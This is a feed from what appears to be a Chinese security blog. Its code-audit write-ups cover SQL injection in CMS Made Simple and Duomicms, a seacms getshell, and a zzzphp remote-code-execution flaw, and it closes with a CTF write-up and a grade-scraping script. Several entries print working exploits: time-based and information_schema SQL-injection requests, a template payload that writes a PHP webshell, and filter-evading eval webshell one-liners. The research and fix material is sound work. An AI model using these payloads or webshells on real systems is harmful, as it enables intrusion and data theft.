alt="1568723276614"></p><p>action.default.php第59行漏洞触发关键点,将$idlist拼接进字符串,explode函数拆分字符串，截取关键代码进行分析</p><p>for循环第一次<code>count($tmp)=2</code>，由于进入if条件语句删除了数组第一个字符。第二次判断<code>count($tmp)=1</code>,此时$i=1不满足跳出循环，第二个字符串<code>&#39;1)) and sleep(5) --&#39;</code>就不会被强制转换为数值</p><pre><code class="hljs php">$idlist=<span class="hljs-string">'0,1)) and sleep(5) --'</span>;$tmp = explode(<span class="hljs-string">','</span>,$idlist);            <span class="hljs-keyword">for</span>( $i = <span class="hljs-number">0</span>; $i &lt; count($tmp); $i++ ) &#123;                $tmp[$i] = (int)$tmp[$i];                <span class="hljs-keyword">if</span>( $tmp[$i] &lt; <span class="hljs-number">1</span> ) <span class="hljs-keyword">unset</span>($tmp[$i]);            &#125;</code></pre><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>逗号、单引号被实体编码需要绕过</p><pre><code class="hljs http">mact=News,m1_,default,0&amp;m1_idlist=0,1))and(case+when+ascii((select+substr(database()+from+1+for+1))%3d99)+then+sleep(1)+else+0+end)%23</code></pre><p><img src="./cmcms%3C=2.2.9sql%E6%B3%A8%E5%85%A5.assets/1568723641057.png" srcset="/img/loading.gif" alt="1568723641057"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>2.2.11版本对该处进行修复</p><p>in_array加强了对非法字符串的判断,去掉unset操作</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>($params[<span class="hljs-string">'idlist'</span>]) ) &#123;    $idlist = $params[<span class="hljs-string">'idlist'</span>];    <span class="hljs-keyword">if</span>( is_string($idlist) ) &#123;        $tmp = explode(<span class="hljs-string">','</span>,$idlist);        $idlist = [];        <span class="hljs-keyword">for</span>( $i = <span class="hljs-number">0</span>; $i &lt; count($tmp); $i++ ) &#123;            $val = (int)$tmp[$i];            <span class="hljs-keyword">if</span>( $val &gt; <span class="hljs-number">0</span> &amp;&amp; !in_array($val,$idlist) ) $idlist[] = $val;        &#125;    &#125;    <span class="hljs-keyword">if</span>( !<span class="hljs-keyword">empty</span>($idlist) ) $query1 .= <span class="hljs-string">' (mn.news_id IN ('</span>.implode(<span class="hljs-string">','</span>,$idlist).<span class="hljs-string">')) AND '</span>;&#125;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>seacms&amp;#x3C;&amp;#x3D;9.92前台getshell</title>
    <link href="/2019/09/11/seacms-9-92%E5%89%8D%E5%8F%B0getshell/"/>
    <url>/2019/09/11/seacms-9-92%E5%89%8D%E5%8F%B0getshell/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>mysql语句执行错误，fwrite函数写入报错数据至php文件中.</p><p>参考链接：<a href="https://xz.aliyun.com/t/6191" target="_blank" rel="noopener">https://xz.aliyun.com/t/6191</a></p><h2 id="变量注册"><a href="#变量注册" class="headerlink" title="变量注册"></a>变量注册</h2><p>将传入的全局数组GET、POST、COOKIE循环遍历置为变量</p><p><img src="./1567588663074.png" srcset="/img/loading.gif" alt="1567588663074"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>/comment/api/index.php第18行进入ReadData函数,将定义的全局变量$rlist经implode字符操作赋值为$x</p><p><img src="./1567589057585.png" srcset="/img/loading.gif" alt="1567589057585"></p><p>跟进<code>Readmlst</code>函数，会对<code>$rlist</code>进行危险字符过滤，调用str_ireplace过滤，可以使用双写绕过。</p><p><img src="./1567590104592.png" srcset="/img/loading.gif" alt="1567590104592"></p><p>跟进Readlist函数，    sql执行语句$ids使用小括号包裹，并没有使用引号</p><p><img src="./1567590157080.png" srcset="/img/loading.gif" alt="1567590157080"></p><p>Excute函数执行sql语句，sql.clsss.php第256行，如果sql执行出错，会执行DisplayError.传入参数为$this-&gt;queryString带有sql语句.</p><p><img src="./1567590271276.png" srcset="/img/loading.gif" alt="1567590271276"></p><p>DisplayError将$msg参数写入文件，php文件格式</p><p><img src="./1567590480904.png" srcset="/img/loading.gif" alt="1567590480904"></p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><img src="./1567591016822.png" srcset="/img/loading.gif" alt="1567591016822"></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞挖掘之Duomicmsv1.32后台一处sql注入</title>
    <link href="/2019/08/31/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8BDuomicmsv1-32-sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/08/31/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8BDuomicmsv1-32-sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>漏洞位置：/admin/admin_video.php</p><p>1.$this-&gt;safeCheck由于包含config.php被置为false，跳过了sql检查和过滤</p><p>2.使用自定义$_POST变量</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>/admin/admin_video.php文件存在sql注入</p><p>从源码来看以下两个参数直接接收$_POST参数传递，没有经过common.php转义，可能存在注入，继续跟进</p><pre><code class="hljs php">$v_extraatype = $_POST[v_type_extra];$v_extrajqtype = $_POST[v_jqtype_extra];guanli05@foxmail.com</code></pre><p><img src="./1567238564886.png" srcset="/img/loading.gif" alt="1567238564886"></p><p>跟进/admin/admin_video.php第150行executeNoneQuery方法，</p><p><img src="./1567238802227.png" srcset="/img/loading.gif" alt="1567238802227"></p><p>但188行存在sql语句检查，这里$this-&gt;safeCheck为false直接跳过。跟下该值</p><p>赋值调用栈为admin_video.php-&gt;config.php-&gt;common.php-&gt;sql.class.php,调用构造方法$this-&gt;safeCheck置为true</p><p><img src="./1567239854848.png" srcset="/img/loading.gif" alt="1567239854848"></p><p>代码继续往下执行，在config.php第15行将$dsql-&gt;safeCheck = false;，所以跳过了CheckSql方法的sql语句安全检查，没有任何过滤限制，可以二次注入、延时注入…</p><p><img src="./1567239945759.png" srcset="/img/loading.gif" alt="1567239945759"></p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>首先在admin_video.php界面随便添加个影视界面，扩展分类需要勾上一个</p><p>将提交的get参数acttype更改为edit,修改post包中的&amp;v_type_extra%5B%5D=1’,v_pic=(select user())#，v_pic数据库给的长度最长使用它进行二次注入,如果需要显示额外内容可以考虑substr截取字符</p><p><img src="./1567240447764.png" srcset="/img/loading.gif" alt="1567260210081"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="hljs php">POST /duomicms3<span class="hljs-number">.0</span>/upload/admin/admin_video.php?action=save&amp;acttype=edit HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">68.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">68.0</span>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*<span class="hljs-comment">/*;q=0.8</span><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><span class="hljs-comment">Content-Length: 187</span><span class="hljs-comment">DNT: 1</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">Referer: http://127.0.0.1/duomicms3.0/upload/admin/admin_video.php?action=edit&amp;id=4</span><span class="hljs-comment">Cookie: XDEBUG_SESSION=PHPSTORM; PHPSESSID=9p3bfj6bp74vcbbr5qpu5g30v5</span><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><span class="hljs-comment"></span><span class="hljs-comment">v_name=a&amp;v_enname=a&amp;isuppingyin=1&amp;v_color=&amp;v_type=5&amp;v_state=0&amp;v_type_extra%5B%5D=1',v_pic=(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase())#</span></code></pre><h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/duomicms3.0/upload/admin/admin_video.php?action=save&amp;acttype=edit</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 113<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://127.0.0.1/duomicms3.0/upload/admin/admin_video.php?action=edit&amp;id=4<span class="hljs-attribute">Cookie</span>: XDEBUG_SESSION=PHPSTORM; PHPSESSID=9p3bfj6bp74vcbbr5qpu5g30v5<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1v_name=a&amp;v_enname=a&amp;isuppingyin=1&amp;v_color=&amp;v_type=5&amp;v_state=0&amp;v_type_extra%5B%5D=1',v_nickname=(select+sleep(5))#</code></pre><p><img src="./1567259227743.png" srcset="/img/loading.gif" alt="1567259227743"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><pre><code class="hljs php">$v_extratype = addslashes($_POST[v_type_extra]);$v_extrajqtype = addslashes($_POST[v_jqtype_extra]);</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次自己动手审计收获还是很多的，这类cms都是通用的代码，发现最新版seacms9.98该漏洞也存在</p><p>多刷题，多读代码，多打代码，少睡觉</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>臭烂代码蜕变 | python爬取教务管理系统成绩(初版)</title>
    <link href="/2019/08/27/%E8%87%AD%E7%83%82%E4%BB%A3%E7%A0%81%E8%9C%95%E5%8F%98-python%E7%88%AC%E5%8F%96%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%88%90%E7%BB%A9-%E5%88%9D%E7%89%88/"/>
    <url>/2019/08/27/%E8%87%AD%E7%83%82%E4%BB%A3%E7%A0%81%E8%9C%95%E5%8F%98-python%E7%88%AC%E5%8F%96%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%88%90%E7%BB%A9-%E5%88%9D%E7%89%88/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>比赛中自己的Python代码真的是又臭又烂，花一天学习re、Beautifulsoup、request….。写个爬虫脚本练练手.</p><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><p>通过抓包分析，点击查询会向服务器发送如下参数，而<code>__VIEWSTATE</code>参数访问<code>http://jwgl.fafu.edu.cn/(gbwqej55d4yuib45ubml4kiy)/xscjcx_dq_fafu.aspx?xh=3176017015&amp;xm=%D5%C5%C1%A6&amp;gnmkdm=N121605</code>可以从html中提取</p><p><img src="./1566843562248.png" srcset="/img/loading.gif" alt="1566843562248"></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoupurl=<span class="hljs-string">"http://jwgl.fafu.edu.cn/(gbwqej55d4yuib45ubml4kiy)/xscjcx_dq_fafu.aspx?xh=3176017015&amp;xm=%D5%C5%C1%A6&amp;gnmkdm=N121605"</span>headerspost=&#123;<span class="hljs-string">'Host'</span>: <span class="hljs-string">'jwgl.fafu.edu.cn'</span>,<span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'</span>,<span class="hljs-string">'Referer'</span>: <span class="hljs-string">'http://jwgl.fafu.edu.cn/(32yiyp45ngivva55fcwg1i55)/xscjcx_dq_fafu.aspx?xh=3176017015&amp;xm=%D5%C5%C1%A6&amp;gnmkdm=N121605'</span>&#125;headersget=&#123;<span class="hljs-string">'Host'</span>: <span class="hljs-string">'jwgl.fafu.edu.cn'</span>,<span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'</span>,<span class="hljs-string">'Referer'</span>: <span class="hljs-string">'http://jwgl.fafu.edu.cn/(cxtcui55vpjjaxvewtwl1045)/xs_main.aspx?xh=3176017015'</span>&#125;<span class="hljs-comment"># 获取关键post数据,抓包发现该两个__VIEWSTATE、__VIEWSTATEGENERATOR字段对查询结果产生影响</span>rep1=requests.get(url=url,headers=headersget)m=re.findall(<span class="hljs-string">r'(?&lt;=value=").+"'</span>,rep1.text)__VIEWSTATE=m[<span class="hljs-number">0</span>].replace(<span class="hljs-string">'"'</span>,<span class="hljs-string">''</span>)__VIEWSTATEGENERATOR=m[<span class="hljs-number">1</span>]<span class="hljs-comment"># 年份，可更改</span>ddlxn=<span class="hljs-string">'2018-2019'</span><span class="hljs-comment"># 学期，可更改</span>ddlxq=<span class="hljs-string">'2'</span>btnCx=<span class="hljs-string">"+%B2%E9++%D1%AF+"</span>data=&#123;<span class="hljs-string">'__EVENTTARGET'</span>:<span class="hljs-string">''</span>,<span class="hljs-string">'__EVENTARGUMENT'</span>:<span class="hljs-string">''</span>,<span class="hljs-string">'__VIEWSTATE'</span>:__VIEWSTATE,<span class="hljs-string">'__VIEWSTATEGENERATOR'</span>:__VIEWSTATEGENERATOR,<span class="hljs-string">'ddlxn'</span>:ddlxn,<span class="hljs-string">'btnCx'</span>:btnCx,<span class="hljs-string">'ddlxq'</span>:ddlxq&#125;rep=requests.post(url,headers=headerspost,data=data)rep.encoding=rep.apparent_encodingsoup=BeautifulSoup(rep.text,<span class="hljs-string">'xml'</span>)<span class="hljs-comment"># 创建数组原因是BeautifulSoup产生的结果不适于操作</span>arr=[]arr1=[]arr2=[]arr3=[]<span class="hljs-comment"># 获取所有td标签</span>td=soup.find_all(<span class="hljs-string">'td'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> td:    arr.append(i.string)<span class="hljs-comment"># 获取课程代码</span>td1=soup.find_all(<span class="hljs-string">'td'</span>,string=re.compile(<span class="hljs-string">r'^\d&#123;3,9&#125;$'</span>))count=len(td1)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> td1:    arr1.append(i.string)<span class="hljs-comment"># 获取成绩</span>td2=soup.find_all(string=re.compile(<span class="hljs-string">r'^\d&#123;2&#125;(.\d)?$'</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> td2:    arr2.append(i)<span class="hljs-comment"># 课程代码索引加+1后为课程名称</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(count):    arr3.append(td[arr.index(arr1[i])+<span class="hljs-number">1</span>].string)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(count):    print(<span class="hljs-string">"&#123;0:&lt;14&#125;\t&#123;1:&lt;10&#125;"</span>.format(arr3[i],arr2[i]))</code></pre><p><img src="./1566843390711.png" srcset="/img/loading.gif" alt="1566843390711"></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zzzphp1.7.0远程代码执行</title>
    <link href="/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <url>/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h1><p>str_ireplace函数缺陷无法有效过滤危险参数</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload</p><pre><code class="hljs php">&#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>)file_put_contents(str_replace(<span class="hljs-string">'*'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'osword.pphphp'</span>),str_replace(<span class="hljs-string">'*'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);'</span>));<span class="hljs-comment">//&#125;&#123;end if&#125;</span></code></pre><p>进入后台，在模板管理-&gt;cn2016-&gt;html-&gt;search.html，添加payload</p><p><img src="./1566716805604.png" srcset="/img/loading.gif" alt="1566716805604"></p><p>访问<a href="http://127.0.0.1/search后在seach文件夹下生成osword.php" target="_blank" rel="noopener">http://127.0.0.1/search后在seach文件夹下生成osword.php</a></p><p><img src="./1566717808865.png" srcset="/img/loading.gif" alt="1566717808865"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>zzz_client.php第56行开始模板解析操作</p><p>getlocation()解析url，并进入case操作选择初始模板文件</p><p>/var/www/html/cms/zzzphp/template/pc/cn2016/html/search.html</p><p><img src="./1566711770168.png" srcset="/img/loading.gif" alt="1566711770168"></p><p>调用ParserTemplate类解析模板文件search.html文件</p><p><img src="./1566711882760.png" srcset="/img/loading.gif" alt="1566711882760"></p><p>第2344行parseIfLabel函数解析IF标签，且存在危险函数eval。danger_key方法过滤危险字符</p><p>过滤了关键的’$’</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">danger_key</span><span class="hljs-params">( $s , $len=<span class="hljs-number">255</span>)</span> </span>&#123;   $danger=<span class="hljs-keyword">array</span>(<span class="hljs-string">'php'</span>,<span class="hljs-string">'preg'</span>,<span class="hljs-string">'server'</span>,<span class="hljs-string">'chr'</span>,<span class="hljs-string">'decode'</span>,<span class="hljs-string">'html'</span>,<span class="hljs-string">'md5'</span>,<span class="hljs-string">'post'</span>,<span class="hljs-string">'get'</span>,<span class="hljs-string">'cookie'</span>,<span class="hljs-string">'session'</span>,<span class="hljs-string">'sql'</span>,<span class="hljs-string">'del'</span>,<span class="hljs-string">'encrypt'</span>,<span class="hljs-string">'upload'</span>,<span class="hljs-string">'db'</span>,<span class="hljs-string">'$'</span>,<span class="hljs-string">'system'</span>,<span class="hljs-string">'exec'</span>,<span class="hljs-string">'shell'</span>,<span class="hljs-string">'popen'</span>,<span class="hljs-string">'eval'</span>);       $s = str_ireplace($danger,<span class="hljs-string">"*"</span>,$s);<span class="hljs-keyword">return</span> $s;&#125;</code></pre><p>由于最后进入eval执行，可以调用str_replace将<code>*</code>替换为空字符，然而要执行传入的数据$无法添加,可以使用<code>get_defined_vars()</code>调用<code>_GET</code>数组</p><p><img src="./1566712844506.png" srcset="/img/loading.gif" alt="1566712844506"></p><p><code>preg_match_all</code>，第四个参数默认为<code>PREG_PATTERN_ORDER</code>，会将matches划分为多维数组</p><p><strong>PREG_PATTERN_ORDER</strong></p><p>结果排序为$matches[0]保存完整模式的所有匹配, $matches[1] 保存第一个子组的所有匹配，以此类推。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>preg_match_all(<span class="hljs-string">"|&lt;[^&gt;]+&gt;(.*)&lt;/[^&gt;]+&gt;|U"</span>,    <span class="hljs-string">"&lt;b&gt;example: &lt;/b&gt;&lt;div align=left&gt;this is a test&lt;/div&gt;"</span>,    $out, PREG_PATTERN_ORDER);<span class="hljs-keyword">echo</span> $out[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] . <span class="hljs-string">", "</span> . $out[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] . <span class="hljs-string">"\n"</span>;<span class="hljs-keyword">echo</span> $out[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] . <span class="hljs-string">", "</span> . $out[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] . <span class="hljs-string">"\n"</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>以上例程会输出：</p><pre><code class="hljs kotlin">&lt;b&gt;example: &lt;/b&gt;, &lt;div align=left&gt;<span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> a test&lt;/div&gt;example: , <span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> a test</code></pre><h1 id="get-defined-vars-与getallheaders-shell"><a href="#get-defined-vars-与getallheaders-shell" class="headerlink" title="get_defined_vars()与getallheaders() shell"></a>get_defined_vars()与getallheaders() shell</h1><table><thead><tr><th>环境</th><th>函数</th><th>用法</th></tr></thead><tbody><tr><td>nginx</td><td><code>get_defined_vars()</code></td><td>返回由所有已定义变量所组成的数组</td></tr><tr><td>apache</td><td><code>getallheaders()</code></td><td>获取全部 HTTP 请求头信息</td></tr></tbody></table><h2 id="apache环境"><a href="#apache环境" class="headerlink" title="apache环境"></a>apache环境</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">eval</span>(next(getallheaders())); <span class="hljs-meta">?&gt;</span></code></pre><p><img src="./1566717022182.png" srcset="/img/loading.gif" alt="1566717022182"></p><h2 id="apache和nginx环境通用"><a href="#apache和nginx环境通用" class="headerlink" title="apache和nginx环境通用"></a>apache和nginx环境通用</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">eval</span>(implode(reset(get_defined_vars())));<span class="hljs-meta">?&gt;</span></code></pre><p><img src="./1566717307431.png" srcset="/img/loading.gif" alt="1566717307431"></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">eval</span>(hex2bin(session_id(session_start())));<span class="hljs-meta">?&gt;</span>    In [<span class="hljs-number">6</span>]: <span class="hljs-string">'phpinfo();'</span>.encode(<span class="hljs-string">'hex'</span>)Out[<span class="hljs-number">6</span>]: <span class="hljs-string">'706870696e666f28293b'</span></code></pre><p><img src="./1566717531066.png" srcset="/img/loading.gif" alt="1566717531066"></p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤$"></a>过滤$</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(get_defined_vars()[<span class="hljs-string">'_GET'</span>][<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span></code></pre><p><img src="./1566717729665.png" srcset="/img/loading.gif" alt="1566717729665"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/6068#toc-3" target="_blank" rel="noopener">某php 远程代码执行审计</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019SUCTF Easay-php题解记录</title>
    <link href="/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/"/>
    <url>/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="easy-php"><a href="#easy-php" class="headerlink" title="easy-php"></a>easy-php</h1><p>Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串</p><p>Ascii码大于 0x7F 的字符都会被当作字符串</p><h2 id="可见字符"><a href="#可见字符" class="headerlink" title="可见字符"></a>可见字符</h2><pre><code class="hljs python">In [<span class="hljs-number">35</span>]: string.printableOut[<span class="hljs-number">35</span>]: <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r\x0b\x0c'</span>In [<span class="hljs-number">36</span>]: ee=string.printableIn [<span class="hljs-number">37</span>]: a=map(<span class="hljs-keyword">lambda</span> x:x.encode(<span class="hljs-string">"hex"</span>),list(ee))In [<span class="hljs-number">38</span>]: print(a)[<span class="hljs-string">'30'</span>, <span class="hljs-string">'31'</span>, <span class="hljs-string">'32'</span>, <span class="hljs-string">'33'</span>, <span class="hljs-string">'34'</span>, <span class="hljs-string">'35'</span>, <span class="hljs-string">'36'</span>, <span class="hljs-string">'37'</span>, <span class="hljs-string">'38'</span>, <span class="hljs-string">'39'</span>, <span class="hljs-string">'61'</span>, <span class="hljs-string">'62'</span>, <span class="hljs-string">'63'</span>, <span class="hljs-string">'64'</span>, <span class="hljs-string">'65'</span>, <span class="hljs-string">'66'</span>, <span class="hljs-string">'67'</span>, <span class="hljs-string">'68'</span>, <span class="hljs-string">'69'</span>, <span class="hljs-string">'6a'</span>, <span class="hljs-string">'6b'</span>, <span class="hljs-string">'6c'</span>, <span class="hljs-string">'6d'</span>, <span class="hljs-string">'6e'</span>, <span class="hljs-string">'6f'</span>, <span class="hljs-string">'70'</span>, <span class="hljs-string">'71'</span>, <span class="hljs-string">'72'</span>, <span class="hljs-string">'73'</span>, <span class="hljs-string">'74'</span>, <span class="hljs-string">'75'</span>, <span class="hljs-string">'76'</span>, <span class="hljs-string">'77'</span>, <span class="hljs-string">'78'</span>, <span class="hljs-string">'79'</span>, <span class="hljs-string">'7a'</span>, <span class="hljs-string">'41'</span>, <span class="hljs-string">'42'</span>, <span class="hljs-string">'43'</span>, <span class="hljs-string">'44'</span>, <span class="hljs-string">'45'</span>, <span class="hljs-string">'46'</span>, <span class="hljs-string">'47'</span>, <span class="hljs-string">'48'</span>, <span class="hljs-string">'49'</span>, <span class="hljs-string">'4a'</span>, <span class="hljs-string">'4b'</span>, <span class="hljs-string">'4c'</span>, <span class="hljs-string">'4d'</span>, <span class="hljs-string">'4e'</span>, <span class="hljs-string">'4f'</span>, <span class="hljs-string">'50'</span>, <span class="hljs-string">'51'</span>, <span class="hljs-string">'52'</span>, <span class="hljs-string">'53'</span>, <span class="hljs-string">'54'</span>, <span class="hljs-string">'55'</span>, <span class="hljs-string">'56'</span>, <span class="hljs-string">'57'</span>, <span class="hljs-string">'58'</span>, <span class="hljs-string">'59'</span>, <span class="hljs-string">'5a'</span>, <span class="hljs-string">'21'</span>, <span class="hljs-string">'22'</span>, <span class="hljs-string">'23'</span>, <span class="hljs-string">'24'</span>, <span class="hljs-string">'25'</span>, <span class="hljs-string">'26'</span>, <span class="hljs-string">'27'</span>, <span class="hljs-string">'28'</span>, <span class="hljs-string">'29'</span>, <span class="hljs-string">'2a'</span>, <span class="hljs-string">'2b'</span>, <span class="hljs-string">'2c'</span>, <span class="hljs-string">'2d'</span>, <span class="hljs-string">'2e'</span>, <span class="hljs-string">'2f'</span>, <span class="hljs-string">'3a'</span>, <span class="hljs-string">'3b'</span>, <span class="hljs-string">'3c'</span>, <span class="hljs-string">'3d'</span>, <span class="hljs-string">'3e'</span>, <span class="hljs-string">'3f'</span>, <span class="hljs-string">'40'</span>, <span class="hljs-string">'5b'</span>, <span class="hljs-string">'5c'</span>, <span class="hljs-string">'5d'</span>, <span class="hljs-string">'5e'</span>, <span class="hljs-string">'5f'</span>, <span class="hljs-string">'60'</span>, <span class="hljs-string">'7b'</span>, <span class="hljs-string">'7c'</span>, <span class="hljs-string">'7d'</span>, <span class="hljs-string">'7e'</span>, <span class="hljs-string">'20'</span>, <span class="hljs-string">'09'</span>, <span class="hljs-string">'0a'</span>, <span class="hljs-string">'0d'</span>, <span class="hljs-string">'0b'</span>, <span class="hljs-string">'0c'</span>]In [<span class="hljs-number">39</span>]:</code></pre><p>使用不可打印字符来进行异或，生成<code>_GET</code></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> stringpstr=string.printablehexstr=map(<span class="hljs-keyword">lambda</span> x:x.encode(<span class="hljs-string">'hex'</span>),list(pstr))temphex=<span class="hljs-keyword">lambda</span> x:str(hex(x))print(list(pstr))_=[]G=[]E=[]T=[]<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):        <span class="hljs-keyword">if</span> (chr(i) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> list(pstr)) &amp; (chr(j) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> 